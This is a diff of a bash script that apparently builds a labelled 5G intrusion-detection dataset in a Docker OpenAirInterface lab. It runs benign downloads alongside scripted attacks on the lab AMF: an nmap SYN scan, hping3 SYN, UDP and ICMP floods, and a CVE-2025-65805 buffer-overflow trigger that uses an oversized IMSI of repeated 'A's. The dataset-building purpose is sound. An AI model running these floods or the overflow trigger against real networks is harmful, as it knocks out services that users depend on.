@@ -1,50 +1,48 @@
 #!/usr/bin/env bash
 # =============================================================================
 # 05_generate_traffic.sh
-# Gera tráfego para o dataset: benigno contínuo + ataques convencionais + CVE
-# Duração total: ~300s (5 min)
+# Gera os Cenários 1, 2 ou 3 para o Dataset CVE5G (Duração total: 300s)
 #
 # Uso:
-#   ./scripts/05_generate_traffic.sh
-#   CVE_METHOD=ueransim ./scripts/05_generate_traffic.sh
-#   CVE_METHOD=python   ./scripts/05_generate_traffic.sh
-#   CVE_METHOD=none     ./scripts/05_generate_traffic.sh
+#   SCENARIO=1 ./scripts/05_generate_traffic.sh
+#   SCENARIO=2 ./scripts/05_generate_traffic.sh
+#   SCENARIO=3 ./scripts/05_generate_traffic.sh
 # =============================================================================
 set -euo pipefail
 
 ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 cd "$ROOT_DIR"
 
-# --- Configuração ---------------------------------------------------------
-RESULTS_DIR="results/mixed"
-PCAP_RAW="$RESULTS_DIR/cve5g_mixed_raw.pcap"
-PCAP_FILTERED="$RESULTS_DIR/cve5g_mixed_filtered.pcap"
-LABELS_CSV="$RESULTS_DIR/cve5g_labels.csv"
-TSHARK_PID_FILE="$RESULTS_DIR/tshark_mixed.pid"
-AMF_LOG="$RESULTS_DIR/amf_crash.log"
+# ==========================================================================
+# CONFIGURAÇÃO
+# ==========================================================================
+SCENARIO="${SCENARIO:-2}"
+RESULTS_DIR="results/scenario_${SCENARIO}"
+PCAP_RAW="$RESULTS_DIR/cve5g_s${SCENARIO}_raw.pcap"
+PCAP_FILTERED="$RESULTS_DIR/cve5g_s${SCENARIO}_filtered.pcap"
+LABELS_CSV="$RESULTS_DIR/cve5g_s${SCENARIO}_labels.csv"
+TSHARK_PID_FILE="$RESULTS_DIR/tshark.pid"
+AMF_LOG="$RESULTS_DIR/amf_crash_s${SCENARIO}.log"
 
-# IPs da topologia (conforme docker-compose.yml)
-DN_IP="192.168.70.135"        # oai-ext-dn
-AMF_IP="192.168.70.132"       # oai-amf
-KALI_IP="192.168.70.140"      # oai-attacker
+AMF_IP="192.168.70.132"       
+KALI_IP="192.168.70.140"      
 
-# IP que o UE recebe na sessão PDU - detectado automaticamente
 UE_BIND_IP="${UE_BIND_IP:-}"
-
 AMF_SBI_PORT=80
 AMF_NGAP_PORT=38412
-
 SUDO_PASSWORD="${SUDO_PASSWORD:-}"
 TOTAL_DURATION=300
 
-CVE_METHOD="${CVE_METHOD:-ueransim}"
+TRAFFIC_GEN="oai-traffic-sidecar"
+CVE_METHOD="${CVE_METHOD:-python}"
 EXPLOIT_SRC="scripts/exploits/cve_65805_exploit.py"
 
 T0=$(date +%s)
-
 mkdir -p "$RESULTS_DIR"
 
-# --- Helpers --------------------------------------------------------------
+# ==========================================================================
+# HELPERS
+# ==========================================================================
 sudo_run() {
   if [[ -n "$SUDO_PASSWORD" ]]; then
     printf '%s\n' "$SUDO_PASSWORD" | sudo -S -p '' "$@"
@@ -65,282 +63,252 @@ label() {
   echo "$name,$src,$dst,$t_start,$t_end" >> "$LABELS_CSV"
 }
 
-# Detecta o IP do UE na interface de dados (oaitun_ue1 ou uesimtun0)
 detect_ue_ip() {
   local ip
-  # Tenta a interface de túnel GTP do OAI UE
-  ip=$(docker exec oai-nr-ue1 \
-    bash -c "ip -4 addr show oaitun_ue1 2>/dev/null | grep -oP '(?<=inet )[\d.]+'" \
-  ) || true
-
-  # Fallback: qualquer interface que não seja lo ou eth
+  ip=$(docker exec oai-nr-ue1 bash -c "ip -4 addr show oaitun_ue1 2>/dev/null | grep -oP '(?<=inet )[\d.]+'") || true
   if [[ -z "$ip" ]]; then
-    ip=$(docker exec oai-nr-ue1 \
-      bash -c "ip -4 addr show | grep -v '127\.' | grep -v '192\.168\.' | grep -oP '(?<=inet )[\d.]+' | head -1" \
-    ) || true
+    ip=$(docker exec oai-nr-ue1 bash -c "ip -4 addr show | grep -v '127\.' | grep -v '192\.168\.' | grep -oP '(?<=inet )[\d.]+' | head -1") || true
   fi
-
   echo "$ip"
 }
 
 amf_alive() {
-  container_running oai-amf && \
-    docker exec oai-amf bash -c "kill -0 1 2>/dev/null" 2>/dev/null
+  container_running oai-amf && docker exec oai-amf bash -c "kill -0 1 2>/dev/null" 2>/dev/null
 }
 
 capture_amf_crash_log() {
   echo "[$(elapsed)s] Capturando logs do AMF (evidência de crash)..."
   docker logs oai-amf --tail 50 > "$AMF_LOG" 2>&1 || true
-  echo "[$(elapsed)s] Log do AMF salvo em: $AMF_LOG"
 }
 
-wait_kali_ready() {
-  echo "Aguardando ferramentas do Kali ficarem prontas (pode levar 2-3 min)..."
-  local max_wait=180 waited=0
-  while ! docker exec oai-attacker test -f /tmp/ready 2>/dev/null; do
+wait_ready() {
+  local container="$1" sentinel="$2" label_="$3" max_wait="${4:-180}"
+  echo "Aguardando $label_ ficar pronto..."
+  local waited=0
+  while ! docker exec "$container" test -f "$sentinel" 2>/dev/null; do
     if [[ $waited -ge $max_wait ]]; then
-      echo "[erro] Kali não ficou pronto após ${max_wait}s."
-      echo "       Verifique com: docker logs oai-attacker"
-      exit 1
+      echo "[erro] $label_ não ficou pronto após ${max_wait}s."; exit 1
     fi
-    sleep 5
-    waited=$(( waited + 5 ))
-    echo "  ... aguardando Kali ($waited/${max_wait}s)"
+    sleep 5; waited=$(( waited + 5 ))
+    echo "  ... aguardando $label_ ($waited/${max_wait}s)"
   done
-  echo "Kali pronto."
+  echo "$label_ pronto."
 }
 
-# --- Cleanup --------------------------------------------------------------
+safe_sleep_until() {
+  local target="$1"
+  local now; now=$(elapsed)
+  local remaining=$(( target - now ))
+  if [[ $remaining -gt 0 ]]; then sleep "$remaining"; fi
+}
+
+# ==========================================================================
+# TRÁFEGO BENIGNO
+# ==========================================================================
+start_benign_traffic() {
+  local ue_ip="$1"
+  local duration="$2"
+
+  log "Configurando rotas para o túnel 5G..."
+  docker exec "$TRAFFIC_GEN" bash -c "
+    echo 'nameserver 8.8.8.8' > /etc/resolv.conf
+    ip rule add from ${ue_ip} table 100 2>/dev/null || true
+    ip route add default dev oaitun_ue1 table 100 2>/dev/null || true
+  " || true
+
+  log "Iniciando ISO Ubuntu ..."
+  docker exec -d "$TRAFFIC_GEN" bash -c "
+    END=\$(( \$(date +%s) + ${duration} ))
+    while [[ \$(date +%s) -lt \$END ]]; do
+      wget -q -O /dev/null --bind-address=${ue_ip} --limit-rate=20m --timeout=30 https://releases.ubuntu.com/22.04/ubuntu-22.04.5-desktop-amd64.iso 2>/dev/null || true
+      sleep 3
+    done
+  "
+
+  log "Iniciando YouTube via yt-dlp..."
+  docker exec -d "$TRAFFIC_GEN" bash -c "
+    END=\$(( \$(date +%s) + ${duration} ))
+    while [[ \$(date +%s) -lt \$END ]]; do
+      yt-dlp --source-address ${ue_ip} --format 'bestaudio[ext=m4a]' --output '/tmp/yt_%(id)s.%(ext)s' --no-playlist --quiet 'https://www.youtube.com/watch?v=jNQXAC9IVRw' 2>/dev/null || true
+      rm -f /tmp/yt_*.m4a 2>/dev/null || true
+      sleep 5
+    done
+  "
+}
+
+# ==========================================================================
+# ATAQUES
+# ==========================================================================
+run_portscan() {
+  local until_s="$1"
+  log "Ataque 1: Port Scan → $AMF_IP"
+  local TS; TS=$(elapsed)
+  docker exec oai-attacker nmap -sS -p 80,8080,38412,2152 -T4 "$AMF_IP" >/tmp/nmap_result.txt 2>&1 &
+  local NMAP_PID=$!
+  while kill -0 $NMAP_PID 2>/dev/null && [[ $(elapsed) -lt $until_s ]]; do sleep 1; done
+  kill $NMAP_PID 2>/dev/null || true
+  local TE; TE=$(elapsed)
+  label "attack_portscan" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
+}
+
+run_flood() {
+  local attack_name="$1"
+  local hping_args="$2"
+  local duration_s="$3"
+  log "Ataque: $attack_name → $AMF_IP (${duration_s}s, foreground)"
+  local TS; TS=$(elapsed)
+  docker exec oai-attacker timeout "$duration_s" hping3 $hping_args >/dev/null 2>&1 || true
+  local TE; TE=$(elapsed)
+  label "attack_${attack_name}" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
+}
+
+run_flood_background() {
+  local attack_name="$1"
+  local hping_args="$2"
+  local duration_s="$3"
+  log "Ataque: $attack_name → $AMF_IP (${duration_s}s, background)"
+  local TS; TS=$(elapsed)
+  docker exec -d oai-attacker timeout "$duration_s" hping3 $hping_args >/dev/null 2>&1 || true
+  label "attack_${attack_name}" "$KALI_IP" "$AMF_IP" "$TS" "$((TS + duration_s))"
+}
+
+run_cve() {
+  log "Ataque CVE: CVE-2025-65805 → $AMF_IP"
+  docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
+  local TS; TS=$(elapsed)
+
+  if [[ "$CVE_METHOD" == "ueransim" ]]; then
+    local OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
+    docker exec oai-nr-ue2 timeout 25 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi "${OVERSIZED_IMSI}" -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/dev/null 2>&1 || true
+  elif [[ "$CVE_METHOD" == "python" ]]; then
+    docker exec oai-attacker python3 /tmp/cve_65805_exploit.py --target "$AMF_IP" --port "$AMF_NGAP_PORT" --imsi-len 1500 >/dev/null 2>&1 || true
+  fi
+
+  local TE; TE=$(elapsed)
+  label "attack_cve_65805" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
+
+  sleep 3
+  if ! amf_alive; then
+    log "*** AMF CRASHED ***"; capture_amf_crash_log
+    label "benign_interrupted_by_cve" "$AMF_IP" "$UE_BIND_IP" "$TE" "$TE"
+  fi
+}
+
+# ==========================================================================
+# CLEANUP
+# ==========================================================================
 cleanup() {
-  echo "[cleanup] Encerrando processos..."
+  echo "[cleanup] Encerrando processos e guardando logs..."
   if [[ -f "$TSHARK_PID_FILE" ]]; then
     local pid; pid="$(cat "$TSHARK_PID_FILE")"
-    if kill -0 "$pid" 2>/dev/null; then
-      sudo_run kill "$pid" || true
-    fi
+    if kill -0 "$pid" 2>/dev/null; then sudo_run kill "$pid" || true; fi
     rm -f "$TSHARK_PID_FILE"
   fi
-  docker exec oai-nr-ue1 pkill iperf3 2>/dev/null || true
-  docker exec oai-ext-dn pkill iperf3 2>/dev/null || true
+  # Apaga o Sidecar (mata todos os fluxos benignos juntos)
+  docker rm -f "$TRAFFIC_GEN" >/dev/null 2>&1 || true
+  
+  # Mata processos no Kali silenciando a saída para não poluir o terminal
+  docker exec oai-attacker pkill hping3 >/dev/null 2>&1 || true
+  docker exec oai-attacker pkill nmap >/dev/null 2>&1 || true
 }
 trap cleanup EXIT
 
 # ==========================================================================
-# PRÉ-CHECKS  (antes de definir T0 do experimento)
+# PRÉ-CHECKS
 # ==========================================================================
+echo "=== CVE5G — Pré-checks para Cenário ${SCENARIO} ==="
 
-# 1. Containers obrigatórios
-for c in oai-ext-dn oai-nr-ue1 oai-attacker oai-amf; do
-  if ! container_running "$c"; then
-    echo "[erro] Container $c não está ativo. Execute scripts/01_bootstrap.sh"
-    exit 1
-  fi
+for c in oai-upf oai-nr-ue1 oai-attacker oai-amf; do
+  if ! container_running "$c"; then echo "[erro] Container $c não está ativo."; exit 1; fi
 done
 
-# 2. tshark no host
-if ! command -v tshark >/dev/null 2>&1; then
-  echo "[erro] tshark não encontrado no host."; exit 1
-fi
+# NAT no UPF
+docker exec oai-upf iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true
+docker exec oai-upf iptables -t nat -A POSTROUTING -s 12.1.1.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true
 
-# 3. Arquivo do exploit (antes do docker cp)
+# --- MÁGICA DO SIDECAR CONTAINER ---
+echo "Subindo container Sidecar atrelado à rede do UE1..."
+docker rm -f "$TRAFFIC_GEN" >/dev/null 2>&1 || true
+docker run -d --name "$TRAFFIC_GEN" --network container:oai-nr-ue1 --cap-add NET_ADMIN kalilinux/kali-rolling tail -f /dev/null >/dev/null 2>&1
+
+echo "Instalando dependências de tráfego no Sidecar (Pode levar ~60s)..."
+docker exec "$TRAFFIC_GEN" bash -c "
+  apt-get update -qq &&
+  apt-get install -y -qq procps wget curl python3 python3-pip iptables iproute2 dnsutils &&
+  pip3 install yt-dlp --break-system-packages --quiet &&
+  touch /tmp/traffic_ready
+"
+
+wait_ready "oai-attacker" "/tmp/ready"         "Kali Linux" 180
+wait_ready "$TRAFFIC_GEN" "/tmp/traffic_ready" "Sidecar"    180
+
 if [[ "$CVE_METHOD" == "python" ]]; then
-  if [[ ! -f "$EXPLOIT_SRC" ]]; then
-    echo "[erro] Exploit não encontrado: $EXPLOIT_SRC"
-    echo "       Crie o arquivo antes de usar CVE_METHOD=python"
-    exit 1
-  fi
-fi
-
-# 4. Aguarda instalação do Kali terminar
-wait_kali_ready
-
-# 5. Copia exploit (só se necessário)
-if [[ "$CVE_METHOD" == "python" ]]; then
-  echo "Copiando exploit para o container Kali..."
+  if [[ ! -f "$EXPLOIT_SRC" ]]; then echo "[erro] Exploit $EXPLOIT_SRC não encontrado!"; exit 1; fi
   docker cp "$EXPLOIT_SRC" oai-attacker:/tmp/cve_65805_exploit.py
 fi
 
-# 6. Detecta IP do UE se não fornecido
 if [[ -z "$UE_BIND_IP" ]]; then
   echo "Detectando IP do UE..."
   UE_BIND_IP=$(detect_ue_ip)
-  if [[ -z "$UE_BIND_IP" ]]; then
-    echo "[erro] Não foi possível detectar o IP do UE."
-    echo "       Forneça manualmente: UE_BIND_IP=12.1.1.2 ./scripts/05_generate_traffic.sh"
-    exit 1
-  fi
-  echo "IP do UE detectado: $UE_BIND_IP"
+  if [[ -z "$UE_BIND_IP" ]]; then echo "[erro] IP do UE não detectado."; exit 1; fi
+  echo "IP detectado: $UE_BIND_IP"
 fi
 
 # ==========================================================================
-# INÍCIO DO EXPERIMENTO — T0 real começa aqui
+# INÍCIO DO EXPERIMENTO
 # ==========================================================================
 echo ""
-echo "=== CVE5G — Geração de Dataset Misto (${TOTAL_DURATION}s) ==="
-echo "    Método CVE:  $CVE_METHOD"
-echo "    UE IP:       $UE_BIND_IP"
-echo "    AMF IP:      $AMF_IP"
-echo "    Kali IP:     $KALI_IP"
-echo ""
-
+echo "=== CVE5G — Geração Cenário ${SCENARIO} (${TOTAL_DURATION}s) ==="
 echo "label,src_ip,dst_ip,t_start,t_end" > "$LABELS_CSV"
-T0=$(date +%s)  
+T0=$(date +%s)
 
-# [T=0] Captura global
-log "Iniciando captura na interface oaiworkshop..."
-sudo_run tshark -i oaiworkshop -w "$PCAP_RAW" >/tmp/tshark_mixed.log 2>&1 &
+log "Iniciando captura contínua..."
+sudo_run tshark -i oaiworkshop -w "$PCAP_RAW" >/tmp/tshark_s${SCENARIO}.log 2>&1 &
 echo $! > "$TSHARK_PID_FILE"
-sleep 2
 
-# [T=2] Servidor de dados
-log "Iniciando servidor iperf3 no DN..."
-docker exec -d oai-ext-dn iperf3 -s
-sleep 2
-
-# [T=4] Verificação de conectividade UE→DN
-log "Verificando conectividade UE→DN (iperf3 5s)..."
-if ! docker exec oai-nr-ue1 \
-     iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -t 5 --connect-timeout 3000 \
-     >/dev/null 2>&1; then
-  echo "[erro] UE não consegue alcançar o DN."
-  echo "       Verifique: docker exec oai-nr-ue1 ip route"
-  exit 1
-fi
-
-# [T=9] Streams de tráfego benigno (correm pelo experimento todo)
-log "Iniciando streams benigno (vídeo TCP + áudio UDP)..."
-TS_BENIGN=$(elapsed)
-docker exec -d oai-nr-ue1 iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -R -t "$TOTAL_DURATION" -b 15M
-docker exec -d oai-nr-ue1 iperf3 -B "$UE_BIND_IP" -c "$DN_IP" -u  -b 2M  -t "$TOTAL_DURATION"
-label "benign_video_tcp" "$UE_BIND_IP" "$DN_IP" "$TS_BENIGN" "$TOTAL_DURATION"
-label "benign_audio_udp"  "$UE_BIND_IP" "$DN_IP" "$TS_BENIGN" "$TOTAL_DURATION"
-
-log "Aguardando 30s de tráfego benigno antes dos ataques..."
+log "Fase baseline (0s→30s): rede em repouso."
 sleep 30
 
-# ==========================================================================
-# ATAQUE 1: Port Scan (nmap SYN)                               ~T=40s
-# ==========================================================================
-log "Ataque 1: Port Scan → $AMF_IP"
-TS=$(elapsed)
-docker exec oai-attacker \
-  nmap -sS -p 80,8080,38412,2152 -T4 "$AMF_IP" \
-  >/tmp/nmap_result.txt 2>&1 || true
-TE=$(elapsed)
-label "attack_portscan" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
-log "Ataque 1 finalizado (${TS}s→${TE}s)."
-sleep 10
+TS_BENIGN=$(elapsed)
+BENIGN_DUR=$(( TOTAL_DURATION - TS_BENIGN ))
+log "Iniciando tráfego benigno realista..."
+start_benign_traffic "$UE_BIND_IP" "$BENIGN_DUR"
+label "benign_iso_tcp"     "$UE_BIND_IP" "releases.ubuntu.com" "$TS_BENIGN" "$TOTAL_DURATION"
+label "benign_ytdlp_https" "$UE_BIND_IP" "youtube.com"         "$TS_BENIGN" "$TOTAL_DURATION"
 
-# ==========================================================================
-# ATAQUE 2: TCP SYN Flood (30s)                                ~T=80s
-# ==========================================================================
-log "Ataque 2: TCP SYN Flood → $AMF_IP:$AMF_SBI_PORT"
-TS=$(elapsed)
-docker exec oai-attacker \
-  timeout 30 hping3 -S --flood -p "$AMF_SBI_PORT" "$AMF_IP" \
-  >/dev/null 2>&1 || true
-TE=$(elapsed)
-label "attack_syn_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
-log "Ataque 2 finalizado (${TS}s→${TE}s)."
-sleep 10
+if [[ "$SCENARIO" == "1" ]]; then
+  log "Cenário 1: apenas tráfego benigno."
 
-# ==========================================================================
-# ATAQUE 3: UDP Flood (30s)                                    ~T=120s
-# ==========================================================================
-log "Ataque 3: UDP Flood → $AMF_IP:$AMF_SBI_PORT"
-TS=$(elapsed)
-docker exec oai-attacker \
-  timeout 30 hping3 --udp --flood -p "$AMF_SBI_PORT" "$AMF_IP" \
-  >/dev/null 2>&1 || true
-TE=$(elapsed)
-label "attack_udp_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
-log "Ataque 3 finalizado (${TS}s→${TE}s)."
-sleep 10
+elif [[ "$SCENARIO" == "2" ]]; then
+  log "Cenário 2: ataques sequenciais."
+  safe_sleep_until 40; run_portscan 65
+  safe_sleep_until 85; run_flood "syn_flood" "-S --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
+  safe_sleep_until 130; run_flood "udp_flood" "--udp --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
+  safe_sleep_until 178; run_flood "icmp_flood" "-1 --flood ${AMF_IP}" 30
+  safe_sleep_until 230; [[ "$CVE_METHOD" != "none" ]] && run_cve
 
-# ==========================================================================
-# ATAQUE 4: ICMP Flood (30s)                                   ~T=160s
-# ==========================================================================
-log "Ataque 4: ICMP Flood → $AMF_IP"
-TS=$(elapsed)
-docker exec oai-attacker \
-  timeout 30 hping3 -1 --flood "$AMF_IP" \
-  >/dev/null 2>&1 || true
-TE=$(elapsed)
-label "attack_icmp_flood" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
-log "Ataque 4 finalizado (${TS}s→${TE}s)."
-sleep 10
-
-# ==========================================================================
-# ATAQUE 5: CVE-2025-65805 — Buffer Overflow NAS parser        ~T=210s
-# ==========================================================================
-if [[ "$CVE_METHOD" != "none" ]]; then
-  log "Ataque 5: CVE-2025-65805 (método: $CVE_METHOD) → $AMF_IP"
-  docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
-  TS=$(elapsed)
-
-  if [[ "$CVE_METHOD" == "ueransim" ]]; then
-    log "Injetando payload malicioso via rádio (acordando UE2)..."
-    
-    # Monta o IMSI base + 1100 letras "A" para o Buffer Overflow
-    OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
-    
-    # Roda o modem do UE2 passando o IMSI
-    docker exec oai-nr-ue2 timeout 15 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi ${OVERSIZED_IMSI} -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/tmp/ue2_cve_output.txt 2>&1 || true
-
-  elif [[ "$CVE_METHOD" == "python" ]]; then
-    docker exec oai-attacker \
-      python3 /tmp/cve_65805_exploit.py \
-        --target "$AMF_IP" \
-        --port "$AMF_NGAP_PORT" \
-        --imsi-len 1500 \
-      2>&1 | tee /tmp/cve_exploit_output.txt || true
-  fi
-
-  TE=$(elapsed)
-  label "attack_cve_65805" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
-  log "Ataque 5 finalizado (${TS}s→${TE}s)."
-
-  sleep 3
-  if ! amf_alive; then
-    log "*** AMF CRASHED — DoS confirmado (CVE-2025-65805 reproduzida) ***"
-    capture_amf_crash_log
-    label "benign_interrupted_by_cve" "$AMF_IP" "$UE_BIND_IP" "$TE" "$TE"
-  else
-    log "[aviso] AMF ainda ativo após exploit."
-    log "        Versão instalada: $(docker exec oai-amf cat /VERSION 2>/dev/null || echo 'desconhecida')"
-  fi
-else
-  log "CVE pulada (CVE_METHOD=none)."
+elif [[ "$SCENARIO" == "3" ]]; then
+  log "Cenário 3: ataques sobrepostos."
+  safe_sleep_until 40; run_portscan 60
+  safe_sleep_until 80; run_flood_background "syn_flood" "-S --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
+  safe_sleep_until 100; run_flood_background "udp_flood" "--udp --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
+  safe_sleep_until 120; run_flood "icmp_flood" "-1 --flood ${AMF_IP}" 30
+  safe_sleep_until 200; [[ "$CVE_METHOD" != "none" ]] && run_cve
 fi
 
-# Aguarda completar os 5 minutos
 REMAINING=$(( TOTAL_DURATION - $(elapsed) ))
 if [[ "$REMAINING" -gt 0 ]]; then
-  log "Aguardando mais ${REMAINING}s para completar os 5 minutos..."
+  log "Aguardando mais ${REMAINING}s para completar o tempo."
   sleep "$REMAINING"
 fi
 
-# ==========================================================================
-# FINALIZAÇÃO
-# ==========================================================================
 log "Encerrando captura..."
 cleanup
 trap - EXIT
 
 sudo_run chown "$USER":"$(id -gn)" "$PCAP_RAW" || true
-
-log "Gerando PCAP filtrado (http2, ngap, pfcp, gtp)..."
-tshark -r "$PCAP_RAW" \
-  -Y "http2 or ngap or pfcp or gtp" \
-  -w "$PCAP_FILTERED"
-
+tshark -r "$PCAP_RAW" -Y "http2 or ngap or pfcp or gtp" -w "$PCAP_FILTERED" 2>/dev/null || true
 sudo_run chown "$USER":"$(id -gn)" "$PCAP_FILTERED" || true
 
-echo ""
-echo "=== Concluído ==="
-echo "PCAP bruto:      $PCAP_RAW"
-echo "PCAP filtrado:   $PCAP_FILTERED"
-echo "Rótulos CSV:     $LABELS_CSV"
-echo "Log de crash:    $AMF_LOG"
-echo ""
+echo "=== Concluído — Cenário ${SCENARIO} ==="
 cat "$LABELS_CSV"
